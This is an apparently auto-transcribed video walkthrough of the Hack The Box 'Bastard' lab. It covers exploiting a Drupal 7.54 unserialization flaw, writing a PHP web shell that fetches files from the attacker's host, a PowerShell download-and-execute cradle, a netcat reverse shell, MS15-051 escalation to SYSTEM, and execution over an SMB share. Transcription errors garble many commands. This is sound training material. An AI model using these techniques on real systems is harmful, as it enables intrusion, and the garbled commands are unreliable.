 hey guys what's going on this is epic and we'll be doing the bastard machine from hack the box and since this is a Windows machine and many people that are currently taking the osep have trouble doing Windows without using Metasploit we're not gonna use Metasploit for this machine unfortunately the previs isn't that interesting because it's just a vanilla install of Windows 2008 but I'll try to show some basic enumeration to help you on other machines so let's get right on in like all boxes the boring and maps came with SC for Safe scripts enumerate version SV Oh a I'll put all formats and the IP address a bastard which is 10 10 10 9 take some time to run I've already ran it so we'll just cat the output it is listening on port 81 35 and 49 1 5 for these two ports or Microsoft Windows or procedural call and port 80 is microsoft iis so very obvious this is a Windows server what isn't so obvious when this output is it's a Windows 2008 r2 most likely because the I is version is 7.5 if we just go to google and type is versions it won't tell us 6.0 is tied to Windows 2003 700 is 2008 7 5 2008 r2 8 o is 2012 8 5 2012 r2 they skip 9 because 7 8 9 and 10.0 is 2016 and this 7 8 9 is just a joke because well jokes are fun I think the actual reason they skipped 9 if you're ever wondering is back in the 90s we had a thing called windows 95 and windows 98 and then came Windows ME and windows 2000 so a lazy programmer to decide which Windows version was running if it's between 95 and 98 or 2000 because we'll just get rid of me because this was horrible doesn't exist but these two Windows versions were very similar 2000 was kind of when Windows went with the same kernel for client and server so Windows 2000 drastically different than the 90s variants so not a lot of compatibility between 90s and 2000 a lazy programmer may have just did Windows 9 star and if that exists inside the windows 95 or 98 if that isn't then it's a 2000 era box so to get rid of any weird scenario like that they just probably decided to skip 9 not sure if that's the exact reason but that's what makes sense to me but let's get back to what's important and that is the box so going to the IP address 10 10 10 9 will reveal that is a Drupal box it says powered by Drupal and we see the Drupal logo right there so since it is Drupal I'm gonna run a script a program called drope scan dro ope scan this is gonna take a long time I don't have the output saved but if it's done by the time this video is finished well we get to see what the output looks like if it's not then I leave it you you can run it yourself and see what is going to happen this does a few thousand requests so it takes a long time you may be wondering why don't use drupe skin with dear--you p skin and i'll get to that in just a second so run this with scan Drupal desh you the IP 10 10 10 9 and we'll name this window drip skin so the reason why I don't like do you P scan is just because it has been updated I see this one in books a lot and blog posts but those are a few years old and we look at do you P scans last commit it was 2013 if we do do ope scan and I just type of that but thank you google we see the last commit was 9 days ago and today is September 16th so much much more up to date probably get better results there unfortunately after it does this it does another check and then it's like three thousand so takes very long to finish we'll just let this go in the background and see what we find manually one of the default files in Drupal is change log text all capitals and we see it is running version seven five four and it was published in 2017 of February of 2017 so we can Google Drupal seven dot 5.4 and exploits the very first post says Drupal seven dot X service module unsterilized we can like search seven five four and we see this is specifically doing these exploits against seven five four so chances are this is vulnerable another sign is much of 2017 and remember February of 2017 so blog post came out after that version chances are it is vulnerable to this module could go through all this but it's a relatively complicated exploit with PHP on serialization vulnerability so we'll just check if it's in search buoyed to make things easy so I don't see Drupal seven five four but this seven dot X looks familiar so copy this search boy - X to view this am beyond accessibility I think - seem ad copy to my clipboard now let's see search boy - P okay so now that's my clipboard I can copy that file to my working directory will rename this to Drupal dot PHP and we can begin looking into this exploit so looking into this script we do see it is a PHP script which is odd for an exploit script to be written in but in this case it's not because it's abusing a PHP serialization vulnerability and when doing serialization vulnerabilities it makes sense to do it in whatever language the serialization vulnerabilities in so yeah that's odd there we go that may have caused an error I'm not sure where that line break was so just looking into the script we do see the three stages it's going to use a sequel injection then it's going to alter cast allows to write to a file and then it's going to restore the cache so we know the basic idea it doesn't exactly make sense but when we go down to look at these variables that general understanding is there to know what we reading so the URL obviously we have to do 10 10 10 9 and Drupal is accessible just off the web root not in the folder so get rid of that endpoint path we don't know if this is valid or not so just leave it there filename this is a web show I don't really like on Linux and may be good but since this is a Windows box we're really limited at what we can do with command prompt so I like to use give myself a little bit more flexibility to do that I'm going to create a web shell so create a variable and this is just going to allow us to create a multi-line file and then everything between these geo DS is going to be in this variable and we don't have to worry about escaping quotes or doing anything like that so start it off with PHP then we do if is set and request F upload so this is going to be a file upload portion because windows doesn't have W get curl or anything to easily put files on the file system so I always like to give my web shell a file upload ability so this is a sign the file name we want to upload and then we're gonna do file get contents and then IP so ten ten fifteen one I think my IP is so check that out real quick yes I'm fifteen one and web server listens on eight thousand this dot is going to combine two strings so request upload close that close that okay so what this line is going to do is say hey if this variable F upload exists put the file and get the it's going to go to my web server download the file and put it on the file server that's what it's going to do hopefully that's makes sense close that out we also want to way to execute code so is set request F exec okay and easiest way to execute code would be let's see that go pre and that pre HTML tag is just gonna make it so we want to view the source it's gonna tell us hey line breaks or line breaks don't expect the BR and then she'll exec request we called it what f exact I think this doesn't have Paris I guess we'll find out see syntax error line eighty of course it does not my code and I think we're actually good if we wanted to see what this exactly looks like we can uh let's see West Drupal copy this okay PHP has a interactive mood so copy that and then we can just echo PHP code and we do see that variable looks like it is set I do notice one mistake I don't have this closed off in the HTML so let's fix that okay I did not close this off I believe this is fine I guess we'll find out so let's run the exploit against the server and see what happens so it's going and it failed to login so let's pipe this over into burp and we'll see what's going on so easiest way to do this will bind burp to a port let's just go like eighty ninety I guess it doesn't matter redirect all requests to ten ten ten nine one point eighty turn that on intercepts off so if I go to one 2700 two I guess eighty ninety fails to connect one yeah so go 2-1 27001 and it pulls up the 10 10 10 9 page so next step is to edit that script again to replace the 10 10 9 with a new location which is one 2700 one foot 80 90 and then run this and before you do let's turn intercept on and I actually want to change intercept to intercept the client requests disable this so we intercept everything and when we run this we'll see what the server says back to us so right off the bat I have two slashes here so I can fix that it doesn't need that trailing and the first response is a HTTP 404 error not found and right after that everything ends up stopping so it tries to go to the rest endpoint and then fails I just started guessing random endpoint addresses and took off that underscore endpoint and had just put rest and it ends up existing I believe yeah so we get it okay there so again just dumb luck there you could do this through like a derp scan or other things because if you go to this URL 10 10 10 9 breast it says the endpoint is set up if we do rest endpoint that doesn't exist so to modify the exploit you just had to find out what that exact URL was coded to this is something the user sets up so fix that we found we don't need this trailing slash and we also have to change this to be 10 10 10 9 so let's try running the script again and see what happens it says stored session information stored user information cache and file written so if we go to 10 10 10 9 / if SEC PHP it exists we can do like F exec equals LS it's windows f exec equals dur and we get the output awesome so we have code execution but let's see what files it actually dropped so let's look at this user JSON we could try cracking this Drupal password this looks like it's the ID of the Drupal user let's look at what session is we have the session information it used to login as admin so let's go in Firefox use the cookie manager plus plugin create some new cookies so let's take this session ID let's take its value it's for the debate 10 10 10 9 save this exit out and now we're going to be sending the administrator cookie as us when we go to 10 10 10 9 and we'll see we're logged in as admin another way we get code execution is to go into I think the configuration or modules I hate Drupal I don't know this admin structure really well and this has a option under modules for the PHP filter allows embedded PHP code so if we set this to enable save the configuration I guess I'll just do this a new tab while that loads and this may be what the exploit is doing once it logs in but we enabled PHP text so we can just give this a title just do some PHP code so PHP info the body set this text format to PHP code and preview the page so we have code execution this way by just having admin it's a bit easier to use the web so we already uploaded so that was just I guess bonus content so first thing I do is let's do a system info I think it is in Windows and this is going to give us some really good information the hot fixes is na this is odd I'm used to seeing hot fixes here so either a user doesn't have permission to look at hot fixes or there's no hot fixes installed I'm gonna go with no hot fixes installed because this is CTF and I guess no patching has been done on this box the other thing I like is this OS version this is gonna indicate there's no service pack and how do we know this well let's just go into Google and see other people that have ran this system info command and see if that version changes so we actually don't want to do that we want to do let's go back because we want to see if this value changes so we don't want to find entries that have this exact value we want to find entries that have the command and the same OS and we're going to do a different thing just because this is probably a generic thing that occurs on a lot of sites so let's find something that may not mix installed will probably not be a common thing that exists on pages with this whole os name so searching this let's go the first result see if they post their system info output they do we do see what we're looking for seven one seven six zero one and service pack 1 again ours was just seven one six seven one seven six zero zero and a and then the build so this na is just no service pack so we know this is a now Windows 2008 r2 no service pack installed and maybe no hot fixes installed so that is good information probably start looking into colonel probe asks but before we do that we're gonna look into some potential misconfigurations because kernel exploits have the potential for a blue screen of death so first step is going to be run power up which is a powershell script that automates a lot of the low-hanging fruit type checks so copy that it's an empire it started in power sploit I believe first we're gonna make one small at it because since this is meant to run an empire Empire sends the argument to it this just kind of loads all the functions and then inspects you to type the final thing which is invoke all checks as a few other options but that's the main one if you wanted to you could probably go back and let's see just search through various functions of the power point module if you want to learn about it we're not too concerned about that we're just going to now try to run it so if we just do well before we do that we have to python m simple HTTP server and then i'm going to do echo IEX for invoke expression new - object net dot web client dot download string and then HTTP 1010 my IP 15 1 8,000 power up ps1 and we'll see what this looks like ok we don't need these quotes then we're going to pipe this into PowerShell - no profile and - to pull from standard in the reason I'm doing this is because if I don't it doesn't run this is a I guess script execution bypass that's really easy to do so that's why I did that we saw it got the script and it is currently running may take a few seconds for it to finish I guess while we wait for that to run we can set up to get a netcat listener so we can get a reverse shell on it so we don't have to keep doing these one-offs - f exec so Windows doesn't have a lot of good tricks to come to reverse shells I do want to check one thing real quick so let's put this into a new window and do system info again this is should tell us 64-bit so we want to get netcat on this machine so if we just search the netcat windows and go to the main page of where netcat is from nmap go to the windows installer we see this is 32-bit which is not good for us because it's a 64-bit machine so go back the next result down here has it for both 32 and 64 so download this and we just want to save I guess we only need the 64-bit version copy that's my desktop and then CP desktop and c64 yeah so the powerup has finished running checking for unquoted service paths and this one failed because we don't have permission to actually do a listing of all services so we see access denied there and we can test it I may just send this to book repeater so it is a bit easier to work with SC QC query state equals all and we get denied so once we prove s we'll run this command again what if that denied no once we prove s we'll run this command again and we'll see we get a listing of all services but because we don't have a listing of all services we can't run this unquoted service path check we also can't check if we have write access - oh we can't check if we can start a stop a service and we can't check if we can overwrite the permissions of a service so checking path for potentially hijack abode DLL locations so we can write to a few directories where Oracle is storing files so if we can restart work well we may get code execution first step is to see if Oracle is running so we're going to do net stat - a n and we see my sequels running 3 306 I don't see Oracle Oracle zone like 1521 so I'm going to ignore this I don't know why it will exist on the box [Music] checking for always elevated this is a UAC thing checking if any users automatically log into Windows check if we can modify autorun checking the tasks event if there's any tasks running another user we can modify checking for any installation scripts that may have been left over from when Windows gets installed so if you remotely install Windows it may drop the script it uses to install Windows and like--see : windows I think panther or something but that doesn't exist I think this is an AI is check I don't actually know it makes sense because we have another Iast thing down here plaintext password McAfee sites list on XML McAfee used to store passwords in this file it doesn't anymore and that's it so powersploit didn't really come with anything another script I used to like but I stopped liking after this box with Sherlock and will copy that over so locate Sherlock ps1 and I say I don't like it because it told me something was involved well when it's the exploit I use so I guess the script has to be updated because one small version is missing so let's look at Sherlock dot ps1 I forget how this runs I don't like that Unicode at the top so let's toast to Unix Sherlock we can get rid of the comments so get file version get architecture set exploit get results find all Vaughn's that's what I want so fine - all phones right this go back and we can just put Sherlock so what I also want to do is upload my net cat so we see n c64 exe is listening we can go back to Python a website was still running so f upload equals n c64 exe and then we can also do a F exactly net file because we upload it before we execute we can do them both in the same request so NC 64 exe then - e CMD the IP 10 10 15 1 and the port will do 80 81 so n CL v NP 80 81 run this and we get a shell so I was hoping is this Sherlock would finish sometime soon and we could see it's telling us it has to be run in 64-bit but it doesn't seem to be well put that there and let that run and I guess we'll cheat because we know this is a vanilla version of Windows 2008 or - no service pack I happen to know it's vulnerable to like MS 15 and MS 16 s the MS 16 s required two processors in it's a race condition and since this lab has like a bunch of CPU restrictions I don't have a lot of luck with that exploits so I'm going to search for the MS 15 Prive esque so ms 15 is at 0 v 1 Prive esque i will do proof of concept see if this comes up yes this is it so go to this one compiled try to download this and I see for some reason Firefox doesn't like this one I'm going to move on I don't think that's actual malware but because my Firefox on Linux Flags this as malware I'm guessing if there's any AV whatsoever on that Windows box it's gonna get flagged so we'll get go down to the next one and I skip that top one because that is Metasploit compiled this the same exact thing I'll go do this it okay and if you're doing this on a real pen test you probably want to go to the source examine it make sure there's no back doors and compile it yourself but since this is just a CTF we're not gonna worry about that because that's a pain so I'm gonna copy that exploit here and Sherlock is done running so see a bunch of MS exploits not vulnerable to MS 10 MS 13 not support on 64-bit 14 saying hey migrate to a 64-bit process migrate to a 64-bit process so that's what Sherlock looks like if we go back to a shell and we see we're on a 64-bit process now because a net cat was that PHP that's on Windows is 32-bit so MS tends not supported 1092 appears vulnerable so that's one you could try 1381 not supported 14:58 not vulnerable 15:51 this the one were actually doing because I have a lot of luck with this exploit and it says not vulnerable so I'm gonna call bull crap on that ms 16 this the one I was talking about that requires two processors and a race condition so we ignored that but that Sherlock normally a great script and it does tell you some things you can try and these should work so just for some reason it missed this one so maybe I'll take a look after this video and post an update or a get commit to see if we can fix that but I digress what was I doing oh we want to test to see exactly how that one exploit works so go back to our thing and we want to upload the file we had just sent so we upload this and we'll just give it an argument so f exec equals that file and we do who am I to see if it works and we see we are anti-authority system so I'm going to put this in quotes because I want to make sure this all goes into parameter number one if I don't put this in quotes then this executable may read like NC has one argument then the - II is another argument so putting in quotes and shows it reads everything as just one argument so ten ten fifteen one that's my P yes and we'll do 80 82 and this NC l v NP 80 82 see rename this to bastard improve and I never do - Who am I we see where I user forgot that one step it failed because it's actually NC 64 DXE and we get a shell so Who am I n - you're 30 system awesome so we can do system info and we just want to see if we got any hot fixes come on I'm not sure why that's not running there's one thing I forgot to mention and when you're looking and you don't see hot fixes one directory you can generally go to is windows software distribution / download and this is a temporary location for updates from wisss so if you saw updates here you'd have an idea the last time updates where at least downloaded to the server it doesn't mean they were actually patched if you wanted to see that you could type the windows update dot logged I think yeah and this will tell you when it's installing patches so that's another way to figure it out back on a privileged account we see hot fixes na so yes we know no hot fixes were installed since installing this copy of Windows so that's essentially it for the machine I guess we can show one last trick that I generally don't do but it may save it may help and like lateral movement on osep or things like that and that's executing follows off UNC shares I say I generally don't do it because well firewalls would generally prevent this but Callie has a built-in thing called in packet SMB server and you just give it your share name and then the directory you want to share out so this is very much like the simple HTTP server except it's for samba so I'm going to stir up a Samba server and to prove we're going to be executing things we're going to let's see rename that MS 15 to be crevasse Exe and that should be fine but for this demo so we're just going to do F exec equals backslash backslash my IP so 10 10 15 one if SEC and I called it privy XE and we'll do Who am I going to SMB server we see the incoming connection and we see it actually executed that so one way to execute files remotely if you don't want to deal with all of the how to get a file onto the Windows computer so hope that's beneficial hope you enjoyed the video I'm sure I missed something I wanted to go through but it is what it is we'll get next windows when hopefully there's a bit more interesting professor than just a kernel exploit take care guys hope you enjoyed bye Ashley that goodbye was a bluff I forgot to show you one thing I said I would show you finished and that is droops can we do see the output here it is it had found the theme 7 found a few URLs that were interesting change log which we looked at and the default admin which is where you log in at user login found the version 754 and then found 3 plugins see tools library services and image so droops can didn't really help us that much we knew most the information that was important already so that's that now this goodbyes for real take care hope you enjoyed